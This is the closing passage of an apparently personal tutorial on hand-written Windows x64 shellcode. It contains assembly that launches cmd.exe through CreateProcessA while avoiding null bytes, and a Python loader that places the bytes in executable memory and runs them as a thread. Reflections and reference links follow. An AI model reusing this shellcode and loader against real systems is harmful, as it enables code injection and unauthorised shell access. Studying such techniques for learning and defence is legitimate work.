        # Call CreateProcessA
        " mov rax, rsp;"                    # Capture the current stack pointer in RAX
        # " sub rax, 0x500;"                # Adjust RAX to point to a new space in the stack for PROCESS_INFORMATION (Null Byte)
        # Fix Null Byte
        " xor r15, r15; "                   # Zero out r15 to start fresh
        " add r15, 0x500FFFFF; "            # Load r15 with a large number
        " shr r15, 0x14; "                  # Right-shift r15 by 20 bits to get 0x500
        " sub rax, r15; "                   # Subtract 0x500 from rax

        " push rax; "                       # Push the address for PROCESS_INFORMATION structure
        " push rdi; "                       # Push the address of the STARTUPINFOA structure
        " xor rax, rax; "                   # Zero out RAX to use as NULL for several parameters
        " push rax; "                       # Set lpCurrentDirectory to NULL
        " push rax; "                       # Set lpEnvironment to NULL
        " push rax;"                        # Placeholder push for alignment or further use
        " inc rax;  "                       # Set RAX to 1 (used for bInheritHandles)
        " push rax; "                       # Push bInheritHandles with value 1 (inherit handles)
        " xor rax, rax; "                   # Zero out RAX again for further NULL uses
        " push rax;"                        # Push NULL for dwCreationFlags
        " push rax;"                        # Additional push for alignment or further parameter setup
        " push rax;"                        # Additional push for alignment or further parameter setup
        " push rax; "                       # Ensure RAX (NULL) is pushed for dwCreationFlags
        " mov r8, rax; "                    # Set lpThreadAttributes to NULL
        " mov r9, rax; "                    # Set lpProcessAttributes to NULL
        " mov rdx, rcx; "                   # Set lpCommandLine to point to the "cmd.exe" string
        " mov rcx, rax; "                   # Set lpApplicationName to NULL
        " call r12; "                       # Call CreateProcessA with address stored in R12
    )
 
    # Initialize engine in 64-Bit mode
    ks = Ks(KS_ARCH_X86, KS_MODE_64)
    instructions, count = ks.asm(SHELLCODE)
 
    sh = b""
    output = ""
    for opcode in instructions:
        sh += struct.pack("B", opcode)                          # To encode for execution
        output += "\\x{0:02x}".format(int(opcode)).rstrip("\n") # For printable shellcode
 
 
    shellcode = bytearray(sh)
    print("Shellcode: " + output )
 
    print("Attaching debugger to " + str(os.getpid()));
    subprocess.Popen(["WinDbgX", "/g","/p", str(os.getpid())], shell=True)
    input("Press any key to continue...");
 
    ctypes.windll.kernel32.VirtualAlloc.restype = ctypes.c_void_p
    ctypes.windll.kernel32.RtlCopyMemory.argtypes = ( ctypes.c_void_p, ctypes.c_void_p, ctypes.c_size_t ) 
    ctypes.windll.kernel32.CreateThread.argtypes = ( ctypes.c_int, ctypes.c_int, ctypes.c_void_p, ctypes.c_int, ctypes.c_int, ctypes.POINTER(ctypes.c_int) ) 
 
    space = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0),ctypes.c_int(len(shellcode)),ctypes.c_int(0x3000),ctypes.c_int(0x40))
    buff = ( ctypes.c_char * len(shellcode) ).from_buffer_copy( shellcode )
    ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_void_p(space),buff,ctypes.c_int(len(shellcode)))
    handle = ctypes.windll.kernel32.CreateThread(ctypes.c_int(0),ctypes.c_int(0),ctypes.c_void_p(space),ctypes.c_int(0),ctypes.c_int(0),ctypes.pointer(ctypes.c_int(0)))
    ctypes.windll.kernel32.WaitForSingleObject(handle, -1);
 
if __name__ == "__main__":
    main()
```

Final thoughts
---

This post has been immensely helpful for consolidating my knowledge about shellcode creation on x64 architectures and employing different registers to make the shellcode position-independent and avoid null bytes that can affect portability. Exploring the Microsoft documentation and guides on other blogs has proven to be very beneficial.

If there is anything I have missed or could be improved, please do not hesitate to contact me and let me know.

### References

* [https://learn.microsoft.com/en-us/cpp/build/x64-calling-convention](https://learn.microsoft.com/en-us/cpp/build/x64-calling-convention){:target="_blank"}
* [https://www.bordergate.co.uk/windows-x64-shellcode-development/](https://www.bordergate.co.uk/windows-x64-shellcode-development/){:target="_blank"}
* [https://www.bordergate.co.uk/windows-x64-reverse-shellcode/](https://www.bordergate.co.uk/windows-x64-reverse-shellcode/){:target="_blank"}
* [https://defuse.ca/online-x86-assembler.htm#disassembly](https://defuse.ca/online-x86-assembler.htm#disassembly){:target="_blank"}
* [https://ferreirasc.github.io/PE-Export-Address-Table/](https://ferreirasc.github.io/PE-Export-Address-Table/){:target="_blank"}
* [https://wajid-nawazish.medium.com/developing-custom-shellcode-in-x64-57172a885d77](https://wajid-nawazish.medium.com/developing-custom-shellcode-in-x64-57172a885d77){:target="_blank"}